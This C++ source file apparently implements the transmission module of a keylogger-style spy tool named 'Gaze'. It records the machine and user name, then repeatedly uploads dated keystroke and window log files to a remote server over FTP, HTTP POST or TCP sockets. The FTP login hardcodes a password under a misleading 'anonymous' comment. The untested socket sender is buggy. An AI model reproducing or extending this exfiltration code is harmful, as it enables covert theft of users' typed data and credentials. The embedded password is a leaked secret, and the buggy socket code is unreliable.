#include "pch.h"
#include "Transmitter.h"

// Transmitter(Logger, Protocol) : Constructor of the transmitter class
Transmitter::Transmitter(Logger* logger, Protocol protocol)

{
	this->Transmitting = false; // Not transmitting by default
	
	this->SetProtocol(protocol);
	this->Machine = Utilities::GetMachineName();
	this->User = Utilities::GetUsername();

	this->SetKey(""); // Default is none
	this->LastTransmission = ""; // Never occured yet
}

// Start() : Start sending log to server (ment to be lunch in a thread)
void Transmitter::Start()
{
	// Lunch the appropriate transmission method depending of the protcol set
	switch (this->GetProtocol())
	{
	case HTTP: this->HttpSender(); break;
	case FTP: this->FtpSender(); break;
	case TCP: this->SocketSender(); break;
	}
}

// Stop() : Stop the transmitter 
void Transmitter::Stop()
{
	this->Transmitting = false;
}

// Ftp();
void Transmitter::FtpSender()
{
	this->Transmitting = true;
	cout << "FTP Transmitter Started" << endl;

	// Keep transmiting while transmitting is set to true
	while (this->IsTransmitting())
	{
		// If elapsed time is >= Waiting time constant defined in Transmitter.h
		if (Timer.getElapsedTime() >= TIME_TRANSMISSION)
		{
			// Initialize the ftp object 
			Ftp ftp;
			// Connect and login to server
			Ftp::Response response_connect = ftp.connect(SERVER_ADDRESS, SERVER_PORT);
			Ftp::Response response_login = ftp.login("pi", "8Mj3Rn2Mm!"); // FTP server configured to accept anonymous connexion
			cout << "[CONNECT] " << response_connect.getMessage() << endl << "[ LOGIN ] " << response_login.getMessage() << endl;

			Ftp::Response response_dir = ftp.createDirectory(Utilities::GetMachineName());
			cout << "[CRT DIR] " << response_dir.getMessage() << endl;

			Ftp::Response response_upload = ftp.upload(Utilities::GetCurrentDate() + ".log", Utilities::GetMachineName() + "/");
			cout << " [UPLOAD] " << response_upload.getMessage() << endl;

			// Disconnect from the FTP server
			ftp.disconnect();

			// Restart timer and actualise LastTransmission
			this->Timer.restart();
			this->LastTransmission = Utilities::GetCurrentDate();
		}

		// Ease CPU
		sleep(microseconds(1000));
	}
	cout << "FTP Transmitter Stopped" << endl;
}

// HttpSender();
void Transmitter::HttpSender()
{
	this->Transmitting = true;
	cout << "HTTP Transmission Started" << endl;

	// Keep transmiting while transmitting is set to true
	while (this->IsTransmitting())
	{
		// If elapsed time is >= Waiting time constant defined in Transmitter.h
		if (Timer.getElapsedTime() >= TIME_TRANSMISSION)
		{
			// Initialize the http object and request
			Http http;
			http.setHost(SERVER_ADDRESS, 8000);
			Http::Request request(WEB_PAGE, Http::Request::Post);

			// Initialize the string stream containing the request
			ostringstream stream;

			// Open the currently active log file
			ifstream file(Utilities::GetCurrentDate() + ".log");


			// Getline by line file content
			string line;
			string content = "";
			while (getline(file, line)) // Even line = window name
			{
				content += line;
			}

			// Forge the http request
			stream << "machine=" << this->GetMachine() << "&user=" << this->GetUser() << "&file=" << content;
			request.setField("From", "Gaze");
			request.setField("Content-Type", "text/plain");
			request.setBody(stream.str());

			// Display request
			cout << stream.str() << endl;

			// Send request and get the response from the server
			Http::Response response = http.sendRequest(request);
			cout << response.getBody() << endl;

			// Restart timer and actualise LastTransmission
			this->Timer.restart();
			this->LastTransmission = Utilities::GetCurrentDate();
		}
		// Ease CPU
		sleep(microseconds(1000));
	}
	cout << "HTTP Transmission Stopped" << endl;
}

void Transmitter::SocketSender()
{
	this->Transmitting = true;
	cout << "Socket Transmission Started" << endl;

	// Keep transmiting while transmitting is set to true
	while (this->IsTransmitting())
	{
		// If elapsed time is >= Waiting time constant defined in Transmitter.h
		if (Timer.getElapsedTime() >= TIME_TRANSMISSION)
		{
			// Not tested
			TcpSocket socket;
			Socket::Status status = socket.connect(SERVER_ADDRESS, SERVER_PORT);

			// If connection to server failed 
			if (status != Socket::Done)
			{
				cout << "Tcp Socket failed to connect.." << endl;
				break;
			}

			ifstream file(Utilities::GetCurrentDate() + ".log");
			char buffer[4096];


			// Loop through file 
			while (file.read(buffer, sizeof(buffer)))
			{
				// Send buffer content 
				socket.send(buffer, sizeof(buffer));
			}

			// Close file properly
			file.close();

			// Restart timer and uptade LastTransmission
			this->Timer.restart();
			this->LastTransmission = Utilities::GetCurrentDate();
		}
		// Ease CPU
		sleep(microseconds(1000));
	}
	cout << "HTTP Transmission Stopped" << endl;
}

// IsTransmitting() : Return Transmitting value
bool Transmitter::IsTransmitting() const
{
	return this->Transmitting;
}

// GetProtocol() : Return the protocol used by the Transmitter
Protocol Transmitter::GetProtocol() const
{
	return this->Prot;
}

// SetProtocol() : Assign the protocol to be used by the transmitter 
void Transmitter::SetProtocol(Protocol prot)
{
	this->Prot = prot;
}

// GetMachine() : Return the machine name
string Transmitter::GetMachine() const
{
	return this->Machine;
}

// GetUser() : Return the window username
string Transmitter::GetUser() const
{
	return this->User;
}

// GetLastTransmission() : Return last time a transmission was done successfully 
string Transmitter::GetLastTransmission() const
{
	return this->LastTransmission;
}

// GetKey() : Return the encryption key
string Transmitter::GetKey() const
{
	return this->Key;
}

// SetKey(string) : Assign a value to the Key attribut
void Transmitter::SetKey(string key)
{
	this->Key = key;
}